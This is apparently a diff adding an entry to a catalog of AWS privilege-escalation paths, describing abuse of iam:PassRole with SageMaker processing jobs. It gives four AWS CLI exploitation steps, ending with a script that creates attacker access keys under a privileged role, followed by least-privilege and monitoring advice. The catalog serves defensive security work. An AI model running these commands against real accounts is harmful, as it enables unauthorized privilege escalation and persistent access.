@@ -1,0 +1,92 @@
+id: sagemaker-003
+name: iam:PassRole + sagemaker:CreateProcessingJob
+category: service-passrole
+services:
+- iam
+- sagemaker
+description: A principal with `iam:PassRole` and `sagemaker:CreateProcessingJob` can create a SageMaker processing job with
+  a privileged execution role. Processing jobs can execute arbitrary container code for data processing tasks and access AWS
+  APIs with the permissions of the attached IAM role. By creating a processing job with a malicious container or processing
+  script, the attacker can execute code with elevated privileges.
+prerequisites:
+  admin:
+  - A role must exist that trusts sagemaker.amazonaws.com to assume it
+  - The role must have administrative permissions (e.g., AdministratorAccess)
+  - An S3 bucket must be accessible to store input/output data
+  lateral:
+  - A role must exist that trusts sagemaker.amazonaws.com to assume it
+  - An S3 bucket must be accessible to store input/output data
+exploitationSteps:
+  awscli:
+  - step: 1
+    command: |
+      echo '#!/bin/bash
+      aws iam create-access-key --user-name attacker
+      ' > process.sh && chmod +x process.sh
+    description: Create a malicious processing script that creates access keys for privilege escalation
+  - step: 2
+    command: |
+      aws s3 cp process.sh s3://BUCKET_NAME/processing/process.sh
+    description: Upload the malicious script to S3
+  - step: 3
+    command: |
+      aws sagemaker create-processing-job \
+        --processing-job-name privesc-processing \
+        --role-arn arn:aws:iam::ACCOUNT_ID:role/PRIVILEGED_ROLE \
+        --app-specification ImageUri=IMAGE_URI,ContainerEntrypoint=/opt/ml/processing/input/process.sh \
+        --processing-inputs '[{"InputName":"code","S3Input":{"S3Uri":"s3://BUCKET_NAME/processing/","LocalPath":"/opt/ml/processing/input","S3DataType":"S3Prefix","S3InputMode":"File"}}]' \
+        --processing-outputs '[{"OutputName":"output","S3Output":{"S3Uri":"s3://BUCKET_NAME/output","LocalPath":"/opt/ml/processing/output","S3UploadMode":"EndOfJob"}}]' \
+        --processing-resources ClusterConfig={InstanceCount=1,InstanceType=ml.m5.large,VolumeSizeInGB=10}
+    description: Create a processing job with the privileged role that executes the malicious script
+  - step: 4
+    command: aws sagemaker describe-processing-job --processing-job-name privesc-processing
+    description: Monitor the processing job status and wait for execution
+recommendation: |
+  Restrict the `iam:PassRole` permission using the principle of least privilege.
+
+  ```json
+  {
+    "Effect": "Allow",
+    "Action": "iam:PassRole",
+    "Resource": "arn:aws:iam::ACCOUNT_ID:role/SpecificSageMakerRole",
+    "Condition": {
+      "StringEquals": {
+        "iam:PassedToService": "sagemaker.amazonaws.com"
+      }
+    }
+  }
+  ```
+
+  Additional controls:
+  - Restrict `sagemaker:CreateProcessingJob` permissions
+  - Monitor CloudTrail for SageMaker processing job creation with privileged roles
+  - Use VPC configuration to isolate processing jobs
+  - Restrict S3 access for processing data sources
+  - Alert on processing jobs with administrative roles being created
+  - Use container image signing and validation
+discoveredBy:
+  name: Spencer Gietzen
+  organization: Rhino Security Labs
+  date: '2019'
+references:
+- title: AWS Privilege Escalation Methods and Mitigation
+  url: https://rhinosecuritylabs.com/aws/aws-privilege-escalation-methods-mitigation/
+- title: IAM Vulnerable - SageMaker PassRole
+  url: https://github.com/BishopFox/iam-vulnerable
+relatedPaths:
+- sagemaker-001
+- sagemaker-002
+toolSupport:
+  pmapper: true
+  iamVulnerable: true
+permissions:
+  required:
+  - permission: iam:PassRole
+    resourceConstraints: Target role ARN must be in the Resource section
+  - permission: sagemaker:CreateProcessingJob
+    resourceConstraints: Must have permission to create SageMaker processing jobs
+  additional:
+  - permission: iam:ListRoles
+    resourceConstraints: Helpful for discovering available roles to pass
+  - permission: iam:GetRole
+    resourceConstraints: Useful for viewing role trust policies and attached permissions
